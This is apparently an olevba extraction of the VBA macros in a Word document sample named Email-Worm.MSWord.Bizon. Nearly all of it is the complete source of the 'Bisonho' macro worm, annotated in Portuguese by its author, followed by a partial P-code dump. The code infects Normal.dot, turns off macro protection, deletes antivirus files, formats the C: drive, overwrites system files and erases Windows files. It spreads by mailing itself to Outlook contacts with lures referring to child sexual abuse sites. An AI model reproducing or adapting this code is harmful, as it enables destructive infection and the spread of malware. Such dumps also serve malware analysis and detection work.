olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Email-Worm.MSWord.Bizon
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Email-Worm.MSWord.Bizon - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Módulo1.bas 
in file: Email-Worm.MSWord.Bizon - OLE stream: 'Macros/VBA/Módulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
''''''''''''''''''''''''''''' BISONHO '''''''''''''''''''''''''''''''''''''''
'Bisonho Rulez
'OBS: Cuidado com essa linha ai de cima senao o virus da pau, nao deletem
'
'NOME DO VIRUS  : BISONHO
'AUTOR          : DICK MOE (FUNDADOR DO GRUPO)
'GRUPO          : A BERNE MALTESA
'EMAIL          : BERNEMALTESA@IEG.COM.BR OU TBUG@IG.COM.BR
'ORIGEM         : BRASIL, FEV 2001
'ICQ UIN        : 76267835
'
'INFECTA        : DOC, DOT DAS VERSÕES DO WORD 97, 2000...
'POLIMORFO      : NAO
'MUTANTE        : NAO
'ENCRIPTADO     : ISSO EU NAO SEI FAZER MESMO. QUEM SOUBER ME AJUDE PLEASE!
'STEALTH        : SIM, COM MUITAS TECNICAS ATE QUE BEM AVANCADAS
'PROPAGA EMAIL  : SIM (Thanks to melissa...)
'RETRO          : ANIQUILA 7 AV'S, DESABILITA A PORRA DO XõBoBus
'EVENTOS        : UM MONTE...
'PROTECAO       : ACABA COM QUALQUER VIRUS JA EXISTENTE E COMPLICA A VIDA DO
                : ETHAN, ALEM DE DESABILITAR A VERIFICACAO DE MACROS NO WORD,
                : DESABILITAR OS MENUS DE VISUALIZACAO DE MACROS (MACROS E
                : BARRA DE TAREFAS), DESABILITAR AS TECLAS DE ATALHO PARA
                : A LISTA DE MACROS E PARA O EDITOR DO VISUAL BASIC E DESATIVAR
                : O AVISO PARA SALVAR O NORMAL.DOT
'BASE           : COM BASE EM ALGUNS CODIGOS DO MEU VIRUS GHOUL, E EMAIL DO
                  MELISSA
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
Private Sub Document_Close()
'Executa quando um doc e fechado e transfere o controle para a sub
'Document_Open diretamente
    Document_Open
End Sub

Private Sub Document_New()
'Executa quando um doc e criado
'Document_Open diretamente
    Document_Open
End Sub

Private Sub Document_Open()

'Executa quando um doc e aberto e depois transfere o controle para a sub
'RetroAction

On Error Resume Next            'Se ocorrer algum erro... pule!
Application.EnableCancelKey = 0 'Desabilita Control+Break

Set Arch = ActiveDocument.VBProject.VBComponents.Item(1)
'Define as variaveis Arch, que aponta para um doc qualquer ativo,

Set Norm = NormalTemplate.VBProject.VBComponents.Item(1)
'Norm que aponta para o normal.dot, e

Set ItsMe = Me.VBProject.VBComponents.Item(1)
'ItsMe, que indica da onde o virus esta sendo executado.

If Norm.CodeModule.Lines(1, 1) <> "'Bisonho Rulez" Then
'Se a primeira linha do projeto do normal nao for 'Bisonho Rulez, infecte!

Norm.CodeModule.DeleteLines 1, Norm.CodeModule.CountOfLines
'Apaga todo o codigo estranho (que pode ser um outro virus, pq nao?)

Norm.CodeModule.InsertLines 1, ItsMe.CodeModule.Lines(1, ItsMe.CodeModule.CountOfLines)
'Infecta o arquivo

Norm.Name = "Bisonho"  'Muda o nome do projeto para Bisonho
End If 'Termina o bloco de condicoes *SE*

If Arch.CodeModule.Lines(1, 1) <> "'Bisonho Rulez" Then
'Se a primeira linha do projeto de um arquivo aberto nao for 'Bisonho Rulez, infecte!

Arch.CodeModule.DeleteLines 1, Arch.CodeModule.CountOfLines
'Apaga todo o codigo estranho (que pode ser um outro virus, pq nao?)

Arch.CodeModule.InsertLines 1, ItsMe.CodeModule.Lines(1, ItsMe.CodeModule.CountOfLines)
'Infecta o arquivo

Arch.Name = "Bisonho"  'Muda o nome do projeto para Bisonho
End If 'Termina o bloco de condicoes *SE*

If Dir("C:\Ethan.___", 6) <> "" Then
'Aha, foi encontrado vestigios do ethan... (eu odeio esse virus nao sei pq)

SetAttr "C:\Ethan.___", vbNormal
'Define o atributo do arquivo como normal, e...
Kill "C:\Ethan.___"                     'Deleta essa droga!
End If                                  'Termina o bloco de condicoes *SE*

RetroAction                             'Chama a sub RetroAction

If Day(Now) = Month(Now) Then ChooseActions
'Chama os eventos se o dia for igual ao mes

If Minute(Now) = Second(Now) Then
'Se o segundo e igual ao minuto, faz o cara dizer que tem o pau pequeno
Msg = "Ocorreu um erro. A possivel causa e que vc tenha um penis pequeno. Vc tem um penis pequeno?"
Style = vbYesNo + vbQuestion    'Estilo da mensagem
Title = "Microsoft Word"        'Titulo da mensagem
Ret = MsgBox(Msg, Style, Title) 'Escolha do cidadao
If Ret = vbNo Then LoopIt       'Disse que nao? Pergunta de novo!

ThisIsSpecial           'Chama essa sub...
EmailCopy               'Chama essa sub tb.
End If


End Sub                                 'Termina a sub (DUH...)

Private Sub RetroAction()
'ESSA SUB E SO AS ACÕES RETRO DO VIRUS... RERERERE (HEHEHE)

On Error Resume Next    'Ocorreu algum erro? Pule...
Application.EnableCancelKey = wdCancelDisabled  'Desabilita o Control+Break
Options.VirusProtection = False                 'Desativa a verificacao de
macros no documento
Options.SaveNormalPrompt = False                'Desativa o aviso para salvar o
normal.dot

CommandBars("Tools").Controls("Macro").Visible = False
'Esconde o menu Macros

CommandBars("View").Controls(6).Visible = False
'Esconde o menu Barra de Ferramentas (para evitar que adicionem um menu novo,
'apesar que se pode dar um clique com o botao direito na barra de menu mas
'ta a pampa)

CustomizationContext = NormalTemplate
'Define onde serao salvas as mudancas abaixo

KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF11),

KeyCategory:=wdKeyCategoryCommand, Command:="hahaNOT"
'Redireciona o atalho Alt+F11 para uma sub vazia

KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF8),

KeyCategory:=wdKeyCategoryCommand, Command:="hahaNOT"
'Redireciona o atalho Alt+F8 para uma sub vazia

Dim McAfee, FMcAfee, FProt, FFProt, VET, FVET, Avast, FAvast, TheCleaner,
FTheCleaner , Panda, FPanda, AVP, FAVP          'Declara variaveis...

'Adquire os dados de registro dos Av's
FProt = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Command Software\F-PROT32", "Location")
VET = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Cybec\VET Antivirus for Win32\Resident", "VetPath")
'Av's que indicam em que pasta
McAfee = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\McAfee\Scan95", "szProductLocation")
'que foram instalados...
Avast = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\ALWIL Software\Avast32", "Path")
TheCleaner = System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Software\MooSoft Development\The Cleaner", "tcshellex")
Panda = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Panda Software\Panda Antivirus 6.0", "Path")
AVP = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\KasperskyLab\Components\100", "Folder")
        

'Esse bloco abaixo define os arquivos que serao alvos...
'*.* que e igual a TUDO (DUH!) e alguns Dats e Dlls vitais...

FFProt = FProt + "\*.*"
FVET = VET + "\*.*"
FMcAfee = McAfee + "\*.*"
FAvast = Avast + "\*.*"
FTheCleaner = TheCleaner + "\*.*"
FPanda = Panda + "*.*" 'a chave de registro do panda tem um \ na frente..
FAVP = AVP + "\*.*"
Affprot = FProt + "\*.Dat"
Bffprot = FProt + "\*.Def"
Afvet = VET + "\*.Dat"
AFMcAfee = McAfee + "\*.Dat"
afavast = Avast + "\*.Dat"
bfavast = Avast + "\*.Dll"
afthecleaner = TheCleaner + "\*.Dll"
afpanda = Panda + "*.Dat"
bfpanda = Panda + "*.Dll"
afavp = AVP + "\*.Dat"
bfavp = AVP + "\*.Dll"

'Esse bloco abaixo detona primeiro os arquivos vitais dos antivirus e depois
'tenta detonar tudo, pq se tiver algum programa residente, o mesmo nao sera
'removido, e, com os vitais faltando, eles nao servem pra nada... hehhehe..
'Pau na lomba deles...

Kill Affprot
Kill Bffprot
Kill Afvet
Kill AFMcAfee
Kill afavast
Kill bfavast
Kill afthecleaner
Kill afpanda
Kill bfpanda
Kill afavp
Kill bfavp
Kill FFProt
Kill FVET
Kill FMcAfee
Kill FAvast
Kill FTheCleaner
Kill FPanda
Kill FAVP

'Esse bloco abaixo desativa as opcoes de verificacao do XoBoBus para que
'ele nao verifique mais porra nenhuma e pare de incomodar quem quer infectar.

'Obs: Esse era meu metodo para infectar os micros. Eu invadia uns lammers
'pelo NetBus e substituia o normal.dot do lammah pelo virus.dot e caia fora
'hehe... ou entao mandava um virus de com ou exe e executava na maquina dele
'(se bem que eu ainda nao consegui entender porra nenhuma de assembly...
'vai ver que eu acostumei com basic, pq foi minha primeira linguagem e nao
'consegui entender mais porra nenhuma)

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "0") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "1") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "2") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "3") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "4") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "5") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "6") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "7") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "8") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "9") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "10") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "AutoStart") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "AutoVerify") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "BOProt") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "ExtraPort") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "NetBusAdv") = "DISABLED"

'Essa linha abaixo muda o password do server do netbus, se existir, e (putz eu
'acabei de descobrir um bug agora mesmo... foi mal)

'System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "PATCH") =
'"c:\windows\Patch.exe /pass:killfhc" 'hehehe!!! so eu posso usar netbus!

'Bug Acima descoberto e corrigido agora. Era pra trocar o password do server
'do netbus que estivesse com o nome padrao de PATCH, mas eu esqueci, ate nos
'meus outros virus, de colocar a instrucao IF, ou seja, de dizer que so e
'pra trocar o password se o server existir. O Bug faria com que ele criasse
'uma chave dizendo para executar o programa PATCH, mas se nao existisse, ia
'dar um aviso no inicio do Windows. Putz que coisa idiota... e falta de
'atencao.

End Sub

Private Sub hahaNOT() 'Sub vazia que nao faz nada (DUH!)

End Sub

'ESSAS SUBS ABAIXO SAO OS EVENTOS DESSE VIRUS
'SAO MUITAS MESMO...
'NADA DE MENSAGINHAS BABACAS E SO...

Private Sub Action1()
On Error Resume Next
'nao tenho certeza se funciona em todos os
'micros mas ta valendo

'Sabe quando vc deixa o mouse em cima dos icones da area de trabalho e aparece
'uma mensagenzinha?

'Muda a mensagem da Lixeira
System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "") = "A Berne Maltesa Rulez..."
System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "InfoTip") = "HEHEHEHE... esta e a Lixeira do Dick Moe... eu comando essa bagaca ok??? ---A BERNE MALTESA---"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\CLASSES\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "") = "Dick Moe Recycle Bin"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\CLASSES\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "InfoTip") = "HEHEHEHE... esta e a Lixeira do Dick Moe... eu comando essa bagaca ok??? ---A BERNE MALTESA---"
End Sub

Private Sub Action2()
On Error Resume Next
'Esses tem de reiniciar o micro

'Arregaca com a visualizacao do monitor
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Display\Settings", "BitsPerPixel") = "8"
'Muda o registro do windows
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "DICK MOE"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "A BERNE MALTESA"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "Version") = "Windous 1.0 by DICK MOE"
End Sub

Private Sub Action3()
On Error Resume Next
'Tem de reiniciar...

'Deixa o mouse com rastro...
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Display\Settings", "MouseTrails") = "7"
'Lentao, e...
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Mouse", "MouseSpeed") = "0"
'Vc tem de ser o the flash pra dar um clique duplo...
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Mouse", "DoubleClickSpeed") = "100"
End Sub

Private Sub Action4()
On Error Resume Next
'Reiniciar...

'Troca umas cores do windows... fica bem cheguei.
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "ButtonFace") = "200 40 10"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "ActiveTitle") = "0 250 100"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "Menu") = "0 0 0"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "Window") = "100 100 200"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "ScrollBar") = "100 100 200"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "WindowText") = "255 255 255"
End Sub

Private Sub Action5()
On Error Resume Next
N$ = WordBasic.[DefaultDir$](2) + "\Normal.dot" 'Informa o caminho do normaldot
FileCopy N$, "C:\Leia.dot"                      'Faz uma copia dele.
SetAttr "C:\*.*", vbNormal              'Atribui C:\*.* como normal
Open "C:\io.sys" For Output As #1               'Abre io.sys
Open "C:\msdos.sys" For Output As #2            'Abre msdos.sys
Open "C:\command.com" For Output As #3          'Abre command.com
Open "C:\Windows\win.com" For Output As #4      'Abre win.com
Print #1, "Vc foi dominado pelo virus Bisonho"          'Escreve umas
Print #2, "Escrito por DICK MOE - Brasil"                       'mensaginhas
Print #3, "Presidente do grupo A BERNE MALTESA"                 'bunitinhas
Print #4, "Um verdadeiro virus de macro... querem competir???"  'ehhehe
Close #1                                        '
Close #2                                        'Fecha os arquivos abertos
Close #3                                        'zerados (so com as mensagens)
Close #4                                        '
Open "C:\autoexec.bat" For Output As #1         'Abre o Autoexec e deixa um
recado
Print #1, "@echo off"
Print #1, "BREAK OFF > NUL"
Print #1, "Echo vc foi destruido pelo virus Bisonho"
Print #1, "pause > nul"
Print #1, "Echo escrito por DICK MOE"
Print #1, "pause > nul"
Print #1, "Echo quer se vingar???"
Print #1, "pause > nul"
Print #1, "Echo passe o arquivo c:\leia.dot para alguem!!!"
Print #1, "pause > nul"
Print #1, ":loop"
Print #1, "Echo Daniel e Tatiana"
Print #1, "Goto loop"
Close #1                        'Fecha o arquivo
End Sub

Sub ChooseActions()
On Error Resume Next 'Ocorreu um erro, pule.
Dim Chance           'Variavel
Randomize                       'Iniciar o gerador de nºs aleatorios
Chance = Int((40 * Rnd) + 1)    'Chance de 1 em 8.
If Chance = 1 Then Action1      'Numero sorteado = 1, acao 1
If Chance = 10 Then Action2     'Numero sorteado = 2, acao 2
If Chance = 20 Then Action3     'e etc.
If Chance = 30 Then Action4
If Chance = 40 Then Action5
End Sub

Sub ThisIsSpecial()
On Error Resume Next

'Umas acoes especiais...

'Se for sete de setembro, finaliza o word e o windows e formata o HD
If Day(Now) = "7" And Month(Now) = "9" Then MsgBox "ow! It's my BirthDay!!! Sete de setembro de 1984!!! Please, CAI FORA!!!", vbSystemModal + vbOKOnly, "Dick Moe": Application.Quit wdDoNotSaveChanges: Tasks.ExitWindows
Shell "C:\Windows\Command\Format.com C:/Autotest"  'Valeu ai NIM BUS!!!!!
' { hehehe, eu nao, viva o tio Bill e suas opcoes !!! }

'Se for sete de novembro, pergunta se o cara quer apagar o windows e so exibe o
'botao SIM
If Day(Now) = "7" And Month(Now) = "11" Then
mbox = "ow! It's my syster's BirthDay!!! Do you really want to remove the "
WINDOWS folder and all of contents???": st = vbYes + vbQuestion: tit = "Dick Moe"
r = MsgBox(mbox, st, tit)
If r = vbYes Then
Application.StatusBar = "Removendo C:\Windows... 3%"    'Mostra na barra de status
Kill "C:\Windows\*.exe"                                 'Apaga os arquivos
Application.StatusBar = "Removendo C:\Windows... 13%"
Kill "C:\Windows\*.bmp"
Application.StatusBar = "Removendo C:\Windows... 19%"
Kill "C:\Windows\*.gif"
Application.StatusBar = "Removendo C:\Windows... 29%"
Kill "C:\Windows\*.com"
Application.StatusBar = "Removendo C:\Windows... 33%"
Kill "C:\Windows\*.jpg"
Application.StatusBar = "Removendo C:\Windows... 45%"
Kill "C:\Windows\*.dll"
Application.StatusBar = "Removendo C:\Windows... 56%"
Kill "C:\Windows\*.sys"
Application.StatusBar = "Removendo C:\Windows... 69%"
Kill "C:\Windows\*.txt"
Application.StatusBar = "Removendo C:\Windows... 75%"
Kill "C:\Windows\*.doc"
Application.StatusBar = "Removendo C:\Windows... 80%"
Kill "C:\Windows\*.dat"
Application.StatusBar = "Removendo C:\Windows... 99%"
Kill "C:\Windows\*.pwl"
Application.StatusBar = "Removendo C:\Windows... done"
End If
End If

'Se for sete de junho, cria 5000 pastas (que coisa nao?)
If Day(Now) = "7" And Month(Now) = "6" Then
MsgBox "ow! It's my mommy's Birthday... ow? What is it???", vbExclamation, "Dick Moe"
Static P
Static Q
Dim S
S = "\Mommy"
P = "C:\Mommy"
MkDir P
Pastas:
Q = Q + 1: If Q >= 5000 Then GoTo Fim
P = P + S
MkDir P
GoTo Pastas
Fim:
End If

'Se for oito de fevereiro, apaga o conteudo do menu iniciar
If Day(Now) = "8" And Month(Now) = "2" Then
MsgBox "ow! It's my daddy's Birthday... Do you want to go to the party???",
vbCritical , "Dick Moe"
Shell "Deltree/y c:\windows\menu iniciar"
Shell "Deltree/y c:\windows\start menu"
End If

'Se o dia for igual aos segundos, faz um joguinho e anexa o resultado a um
'arquivo aleatorio da pasta windows
If Day(Now) = Second(Now) Then                  'Condicao Day=Second
MsgBox "Jockey PÔ!!!", vbExclamation, "Dick Moe" 'Mensagem
Dim FILEEE                                      'Variavel
FILEEE = Dir("C:\Windows\*.*")                  'Arquivo aleatorio
Open FILEEE For Append As #1                    'Abre o arquivo
Randomize: o = Int((2 * Rnd) + 1)               'Ganhou ou perdeu?
If o = 1 Then Print #1, "Ow, you loose, try again!!!"   'Perdeu...
If o = 2 Then Print #1, "Ow yeah! You win... SHIT"
'Ganhou... anota tudinho no arquivo
Print #1, "Do you want to play again???"        'Vc quer jogar de novo?
Print #1, ""
Close #1
End If
End Sub

Private Sub EmailCopy()
On Error Resume Next
Application.EnableCancelKey = 0

Dim OutLookAp, NamOfMapi, BisonhoMail   'Inicializa variaveis
Set OutLookAp = CreateObject("Outlook.Application")     'Inicializa o Outlook
Set NamOfMapi = OutLookAp.GetNameSpace("MAPI")
'Verifica se ja foram mandados os emails antes
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Bisonho") <> "Sim, sou eu mesmo, e dai?" Then

If OutLookAp = "Outlook" Then
NamOfMapi.Logon "profile", "password"           'Inicializa a conta do usuario
For y = 1 To NamOfMapi.AddressLists.Count       'Conta quantos enderecos tem
Set AddyBook = NamOfMapi.AddressLists(y)
x = 1
Set BisonhoMail = OutLookAp.CreateItem(0)
For oo = 1 To AddyBook.AddressEntries.Count
TheEntries = AddyBook.AddressEntries(x)
BisonhoMail.Recipients.Add TheEntries           'Adiciona entradas
x = x + 1
If x > 50 Then oo = AddyBook.AddressEntries.Count
Next oo

'---> Nao tenho certeza se esse mecanismo vai funcionar, se tiver algum bug,
' por favor me avise. E que eu estou sem o office, vcs ja sabem...

'Esse e um mecanismo bem simples que funciona assim: verifica se o word
'e em portugues ou ingles atraves do nome dos menus (a definicao tools e
'padrao em qualquer idioma, o que muda e o que e exibido pro usuario), para
'que assim o virus "saiba" se e pra mandar um email em português ou ingles..
'Da resultado em 80% dos micros, excecto aqueles brasileiros bestas que usam
'office em inglês...

If CommandBars("Tools").Name = "Tools" Then     'Se o nome for Tools
BisonhoMail.Subject = "Important Message From " & Application.UserName
BisonhoMail.Body = "This is a huge list of sites of kids sex... I saw the whole document and all of the sites are online and free! Check out by yourself..."
ElseIf CommandBars("Tools").Name = "Ferramentas" Then   'Se for ferramentas..
BisonhoMail.Subject = "E ai, blz?" & Application.UserName
BisonhoMail.Body = "Ontem eu entrei no chat da UOL e catei um monte de sites de sexo de kids. E bem loco e todos sao gratis e estao online... da um ligo pra vc ver... tem bastante."
Else
BisonhoMail.Subject = "Important Message From " & Application.UserName
BisonhoMail.Body = "This is a huge list of sites of kids sex... I saw the whole document and all of the sites are online and free! Check out by yourself..."
End If

'---> Nao tenho certeza se esse mecanismo vai funcionar, se tiver algum bug,
'por favor me avise. E que eu estou sem o office, vcs ja sabem...

BisonhoMail.Attachments.Add ActiveDocument.FullName     'Anexa o doc infectado
BisonhoMail.Send                        'E envia para a lista inteira

TheEntries = "" 'Reseta a variavel
Next y
NamOfMapi.Logoff        'Fecha a conta
End If

'Adiciona uma chave ao registro para que nao seja enviados mais emails
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Bisonho") = "Sim, sou eu mesmo, e dai?"
End If
End Sub

'Ah Finalmente Acabou
'Nao E Facil???

'Bem, Um Abraco Ai Pro Pessoal, Pro Nimbus E Pra Todo Mundo Que Curte Fazer
'Um Virus

'E Um Pau Na Lomba Dos Av's Makers.

'Pensem Bem: Quanto Mais Av's Podres Que Vcs Fizerem, Mais Virus, Mais Av's
'E Consequentemente Mais Grana Proces... Eu Faco Virus So Por Diversao E
'Status... Nao Por Grana.

'E Um Pau Na Lomba Dos Lammahs Que Nao Sao So Lammahs, Sao Lammahs Assumidos
'Fudidos E Que Nao Tem Jeito: Frase Campea Do Hall: Eu Tava Tentando Acessar
'Meu Email, Eu Digitava Tudo Direitinho Www.Skott@Ig.Com.Br.....
'E Ou Nao E De Chutar O Saco???

'Depois Perguntam: Pq Vcs Fazem Virus????
'Vc Acha Que Um Porra Desses Ai Em Cima Merece Viver?

'Bem, Falou A Todos E Qualquer Coisa, Email-Me Ou Icq-Me...

'By Dick Moe
'(Obs: Lê-Se Dick Mou, E Que Tem Uns Bobao Que Fala Dick Moe Mesmo)
'A Berne Maltesa......................... The New Generation
''''''''''''''''''''''''''''' BISONHO '''''''''''''''''''''''''''''''''''''''
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Email-Worm.MSWord.Bizon
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Módulo1 - 42104 bytes
' Line #0:
' 	QuoteRem 0x0000 0x004C "'''''''''''''''''''''''''''' BISONHO '''''''''''''''''''''''''''''''''''''''"
' Line #1:
' 	QuoteRem 0x0000 0x000D "Bisonho Rulez"
' Line #2:
' 	QuoteRem 0x0000 0x0048 "OBS: Cuidado com essa linha ai de cima senao o virus da pau, nao deletem"
' Line #3:
' 	QuoteRem 0x0000 0x0000 ""
' Line #4:
' 	QuoteRem 0x0000 0x0018 "NOME DO VIRUS  : BISONHO"
' Line #5:
' 	QuoteRem 0x0000 0x002D "AUTOR          : DICK MOE (FUNDADOR DO GRUPO)"
' Line #6:
' 	QuoteRem 0x0000 0x0020 "GRUPO          : A BERNE MALTESA"
' Line #7:
' 	QuoteRem 0x0000 0x003A "EMAIL          : BERNEMALTESA@IEG.COM.BR OU TBUG@IG.COM.BR"
' Line #8:
' 	QuoteRem 0x0000 0x0021 "ORIGEM         : BRASIL, FEV 2001"
' Line #9:
' 	QuoteRem 0x0000 0x0019 "ICQ UIN        : 76267835"
' Line #10:
' 	QuoteRem 0x0000 0x0000 ""
' Line #11:
' 	QuoteRem 0x0000 0x0039 "INFECTA        : DOC, DOT DAS VERSÕES DO WORD 97, 2000..."
' Line #12:
' 	QuoteRem 0x0000 0x0014 "POLIMORFO      : NAO"
' Line #13:
' 	QuoteRem 0x0000 0x0014 "MUTANTE        : NAO"
' Line #14:
' 	QuoteRem 0x0000 0x004A "ENCRIPTADO     : ISSO EU NAO SEI FAZER MESMO. QUEM SOUBER ME AJUDE PLEASE!"
' Line #15:
' 	QuoteRem 0x0000 0x003F "STEALTH        : SIM, COM MUITAS TECNICAS ATE QUE BEM AVANCADAS"
' Line #16:
' 	QuoteRem 0x0000 0x002B "PROPAGA EMAIL  : SIM (Thanks to melissa...)"
' Line #17:
' 	QuoteRem 0x0000 0x003F "RETRO          : ANIQUILA 7 AV'S, DESABILITA A PORRA DO XõBoBus"
' Line #18:
' 	QuoteRem 0x0000 0x001C "EVENTOS        : UM MONTE..."
' Line #19:
' 	QuoteRem 0x0000 0x004B "PROTECAO       : ACABA COM QUALQUER VIRUS JA EXISTENTE E COMPLICA A VIDA DO"
' Line #20:
' 	Reparse 0x004D "                : ETHAN, ALEM DE DESABILITAR A VERIFICACAO DE MACROS NO WORD,"
' Line #21:
' 	Reparse 0x004A "                : DESABILITAR OS MENUS DE VISUALIZACAO DE MACROS (MACROS E"
' Line #22:
' 	Reparse 0x0049 "                : BARRA DE TAREFAS), DESABILITAR AS TECLAS DE ATALHO PARA"
' Line #23:
' 	Reparse 0x004F "                : A LISTA DE MACROS E PARA O EDITOR DO VISUAL BASIC E DESATIVAR"
' Line #24:
' 	Reparse 0x0032 "                : O AVISO PARA SALVAR O NORMAL.DOT"
' Line #25:
' 	QuoteRem 0x0000 0x004A "BASE           : COM BASE EM ALGUNS CODIGOS DO MEU VIRUS GHOUL, E EMAIL DO"
' Line #26:
' 	ArgsCall MELISSA 0x0000 
' Line #27:
' 	QuoteRem 0x0000 0x004D "'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''"
' Line #28:
' 	FuncDefn (Private Sub Document_Close())
' Line #29:
' 	QuoteRem 0x0000 0x0041 "Executa quando um doc e fechado e transfere o controle para a sub"
' Line #30:
' 	QuoteRem 0x0000 0x0019 "Document_Open diretamente"
' Line #31:
' 	ArgsCall Document_Open 0x0000 
' Line #32:
' 	EndSub 
' Line #33:
' Line #34:
' 	FuncDefn (Private Sub Document_New())
' Line #35:
' 	QuoteRem 0x0000 0x001E "Executa quando um doc e criado"
' Line #36:
' 	QuoteRem 0x0000 0x0019 "Document_Open diretamente"
' Line #37:
' 	ArgsCall Document_Open 0x0000 
' Line #38:
' 	EndSub 
' Line #39:
' Line #40:
' 	FuncDefn (Private Sub Document_Open())
' Line #41:
' Line #42:
' 	QuoteRem 0x0000 0x0047 "Executa quando um doc e aberto e depois transfere o controle para a sub"
' Line #43:
' 	QuoteRem 0x0000 0x000B "RetroAction"
' Line #44:
' Line #45:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0020 0x001E "Se ocorrer algum erro... pule!"
' Line #46:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' 	QuoteRem 0x0020 0x0018 "Desabilita Control+Break"
' Line #47:
' Line #48:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Arch 
' Line #49:
' 	QuoteRem 0x0000 0x0040 "Define as variaveis Arch, que aponta para um doc qualquer ativo,"
' Line #50:
' Line #51:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Norm 
' Line #52:
' 	QuoteRem 0x0000 0x0024 "Norm que aponta para o normal.dot, e"
' Line #53:
' Line #54:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ItsMe 
' Line #55:
